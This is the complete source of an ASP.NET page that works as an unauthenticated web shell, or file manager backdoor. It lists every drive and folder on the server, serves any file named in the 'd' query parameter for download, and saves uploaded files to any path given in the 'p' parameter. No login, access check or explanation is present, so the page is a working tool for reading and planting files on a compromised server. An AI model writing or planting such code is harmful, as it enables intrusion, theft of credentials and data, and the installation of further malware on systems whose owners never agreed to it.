<%@ Page Language="C#" %><%@ Import Namespace="System.IO" %><!DOCTYPE html><script runat="server"> string p; protected void Page_Load(object sender, EventArgs e) { p = Request.QueryString["p"]; string d = Request.QueryString["d"]; if (!string.IsNullOrEmpty(d)) { try { FileInfo fileInfo = new FileInfo(d); if (fileInfo.Exists) { Response.Clear(); Response.AddHeader("Content-Disposition", "attachment; filename=" + fileInfo.Name); Response.AddHeader("Content-Length", fileInfo.Length.ToString()); Response.ContentType = "application/octet-stream"; Response.Flush(); Response.TransmitFile(fileInfo.FullName); Response.End(); } } catch(Exception ex) { Response.Write(ex.Message); } } } protected void Button1_Click(object sender, EventArgs e) { try { if (!string.IsNullOrEmpty(p) && FileUpload1.HasFile) { String f = p + "\\" + FileUpload1.FileName; FileUpload1.SaveAs(f); } } catch(Exception ex) { Response.Write(ex.Message); } }</script><html xmlns="http://www.w3.org/1999/xhtml"><body> <form id="form1" runat="server"> <asp:FileUpload ID="FileUpload1" runat="server" /><asp:Button ID="Button1" runat="server" Text="Button" OnClick="Button1_Click" /> </form> <ul> <% if (string.IsNullOrEmpty(p)) { try { foreach (DriveInfo d in DriveInfo.GetDrives()) { Response.Write(string.Format("<li><a href=\"?p={0}\">{0}</a></li>", d.Name)); } } catch (Exception ex) { Response.Write(ex.Message); } } else { try { foreach (string d in Directory.GetDirectories(p)) { Response.Write(string.Format("<li><a href=\"?p={0}\">{0}</a></li>", d)); } foreach (string f in Directory.GetFiles(p)) { Response.Write(string.Format("<li><a href=\"?d={0}\">{0}</a></li>", f)); } } catch (Exception ex) { Response.Write(ex.Message); } } %> </ul></body></html>